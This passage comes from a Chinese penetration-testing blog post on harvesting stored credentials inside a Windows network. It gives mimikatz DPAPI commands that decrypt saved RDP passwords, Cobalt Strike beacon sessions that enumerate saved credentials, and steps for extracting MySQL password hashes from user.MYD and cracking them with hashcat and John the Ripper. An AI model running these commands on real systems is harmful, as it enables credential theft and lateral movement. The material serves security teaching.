的值，待会要通过 guidMasterKey 找对应的 Masterkey 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">dpapi::cred </span><br><span class="line">/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\1E85A94EE31F584E484B8120E3ADA266</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">guidMasterKey      : &#123;34dc48bb-0af9-4925-bf07-f54ba502a40a&#125;</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207311118273.png" alt="image-20220729082150066"></p><ul><li>根据 guidMasterKey  找到对应的 Masterkey</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290823475.png" alt="image-20220729082254297"></p><ul><li>通过 Masterkey 解密 pbData 数据，拿到明文 RDP 连接密码</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpapi::cred </span><br><span class="line">/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\1E85A94EE31F584E484B8120E3ADA266 </span><br><span class="line">/masterkey:f391aa638da6b6d846685f84660ee638bd6d3122214de34285b4dd3bd827a5c3925c5bd7a448c175457c19b2556c9f6f5248ef9256060a5b74c1264d3a5a99f8</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290824301.png" alt="image-20220729082414076"></p><h4 id="netpass"><a href="#netpass" class="headerlink" title="netpass"></a>netpass</h4><blockquote><p><a href="https://www.nirsoft.net/x64_download_package.html">https://www.nirsoft.net/x64_download_package.html</a><br><a href="https://www.nirsoft.net/packages/x64tools.zip">https://www.nirsoft.net/packages/x64tools.zip</a>     nirsoft123!</p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290824401.png" alt="image-20220729082451257"></p><h4 id="Powershell脚本获取RDP连接记录"><a href="#Powershell脚本获取RDP连接记录" class="headerlink" title="Powershell脚本获取RDP连接记录"></a>Powershell脚本获取RDP连接记录</h4><blockquote><p><a href="https://github.com/3gstudent/List-RDP-Connections-History.git">https://github.com/3gstudent/List-RDP-Connections-History.git</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040700775.png" alt="image-20220804070000501"></p><h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br><span class="line">[*] Tasked beacon to run: reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br><span class="line">[+] host called home, sent: 113 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\10.10.10.6    UsernameHint    REG_SZ    MINGY\Administrator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br><span class="line">[*] Tasked beacon to run: dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br><span class="line">[+] host called home, sent: 89 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 C883-5B4B</span><br><span class="line"> C:\Users\Administrator\AppData\Local\Microsoft\Credentials 的目录</span><br><span class="line">2020/09/04  13:24    &lt;DIR&gt;          .</span><br><span class="line">2020/09/04  13:24    &lt;DIR&gt;          ..</span><br><span class="line">2020/09/04  13:24               434 8CAC243098BA9DDD4EAB58433B85D7F0</span><br><span class="line">   1 个文件            434 字节</span><br><span class="line">               2 个目录 56,959,107,072 可用字节</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell cmdkey /list</span><br><span class="line">[*] Tasked beacon to run: cmdkey /list</span><br><span class="line">[+] host called home, sent: 43 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">当前保存的凭据:</span><br><span class="line">    目标: Domain:target=TERMSRV/10.10.10.6</span><br><span class="line">    类型: 域密码</span><br><span class="line">    用户: WIN7-1\administrator</span><br><span class="line">    本地机器持续时间</span><br><span class="line">    </span><br><span class="line">    目标: LegacyGeneric:target=MINGY\WIN7-1</span><br><span class="line">    类型: 普通 </span><br><span class="line">    用户: MINGY\WIN7-1</span><br><span class="line">    </span><br><span class="line">    目标: LegacyGeneric:target=WIN7-1\Administrator</span><br><span class="line">    类型: 普通 </span><br><span class="line">    用户: WIN7-1\Administrator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;dpapi::cred </span><br><span class="line">/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\8CAC243098BA9DDD4EAB58433</span><br><span class="line">B85D7F0&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><h3 id="2-Mysql数据库密码破解"><a href="#2-Mysql数据库密码破解" class="headerlink" title="2 Mysql数据库密码破解"></a>2 Mysql数据库密码破解</h3><p>一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途径来访问数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。<br>MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权限后即可直接从数据库连接文件中读取<br>一般都包含有<strong>数据库类型，物理位置，用户名和密码</strong>等信息</p><h4 id="1、MYSQL数据库文件类型"><a href="#1、MYSQL数据库文件类型" class="headerlink" title="1、MYSQL数据库文件类型"></a>1、MYSQL数据库文件类型</h4><p>MYSQL数据库文件共有 frm 、 MYD 和 MYI 三种文件</p><ul><li>“.frm” 是描述表结构的文件</li><li>“.MYD” 是表的数据文件</li><li>“.MYI” 是表数据文件中任何索引的数据树</li></ul><p>一般是单独存在一个文件夹中<br>与用户有关的一共有三个文件即 user.frm 、 user.MYD 和 user.MYI ，MYSQL数据库用户密码都保存在 user.MYD 文件中，包括root用户和其他用户的密码。</p><h4 id="2、Mysql加密方式"><a href="#2、Mysql加密方式" class="headerlink" title="2、Mysql加密方式"></a>2、Mysql加密方式</h4><p>MYSQL数据库的认证密码有两种方式<br>MYSQL 4.1版本之前是MYSQL323加密，MYSQL 4.1和之后的版本都是MYSQLSHA1加密<br>MYSQL数据库中自带 Old_Password(str)  和 Password(str) 函数,它们均可以在MYSQL数据库里进行查询，前者是 MYSQL323 加密，后者是 MYSQLSHA1 方式加密。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select Password(&#x27;root&#x27;);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| Password(&#x27;root&#x27;)                          |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure><p>MYSQL323 加密中生成的是16位字符串，而在 MYSQLSHA1 中生成的是41位字符串，其中 * 是不加入实际的密码运算中， MYSQLSHA1 加密的密码的实际位数是40位</p><h4 id="3、获取Mysql数据库密码hash值"><a href="#3、获取Mysql数据库密码hash值" class="headerlink" title="3、获取Mysql数据库密码hash值"></a>3、获取Mysql数据库密码hash值</h4><p>用winhex编辑器打开user.MYD文件，使用二进制模式查看，即可得到密码Hash值：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040710562.png" alt="image-20220804071007319"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br></pre></td></tr></table></figure><h4 id="4、Hash破解"><a href="#4、Hash破解" class="headerlink" title="4、Hash破解"></a>4、Hash破解</h4><ul><li>在线网站破解</li></ul><blockquote><p><a href="http://www.cmd5.com/">www.cmd5.com</a><br><a href="http://www.somd5.com/">www.somd5.com</a></p></blockquote><ul><li>hashcat破解</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat.exe -m 300 -a 3 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040711282.png" alt="image-20220804071121105"></p><ul><li>john the ripper破解</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --list=format | grep mysql</span><br><span class="line">john --format=mysql-sha1 mysql.hash</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040712296.png" alt="image-20220804071203110"></p><ul><li>Cain破解</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040712139.png" alt="image-20220804071219948"></p><h3 id="3-其他应用程序密码破解"><a href="#3-其他应用程序密码破解" class="headerlink" title="3 其他应用程序密码破解"></a>3 其他应用程序密码破解</h3><blockquote><p><a href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p></blockquote><p>对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。</p><blockquote><p>源码：<a href="https://github.com/RowTeam/SharpDecryptPwd">https://github.com/RowTeam/SharpDecryptPwd</a></p></blockquote><h1 id="域内密码凭证获取"><a href="#域内密码凭证获取" class="headerlink" title="域内密码凭证获取"></a>域内密码凭证获取</h1><p>见后面域内横向移动那一节~~</p><h1 id="关于Windows的其他知识"><a href="#关于Windows的其他知识" class="headerlink" title="关于Windows的其他知识"></a>关于Windows的其他知识</h1><ol><li>域内账户登录和本机登录的区别</li></ol><p>域内登录需要带上域的域名如GUNGNIR\bob</p><p>当服务器安装完域控制器相关组建后后，这台机器就被提升为域控，本地的administrator账户会被提升为域内的管理员账户。</p><p>域内主机登录本地账户呢 需要以主机名\用户名的形式，比如说一台名为WEB的主机的本地administrator用户是以WEB\administrator形式登录，亦或者.\administrator</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Windows认证机制 </tag>
            
            <tag> 凭证获取 </tag>
            
            <tag> NTLM </tag>
            
            <tag> 票据伪造原理 </tag>
            
            <tag> Kerberos </tag>
            
            <tag> 域认证 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
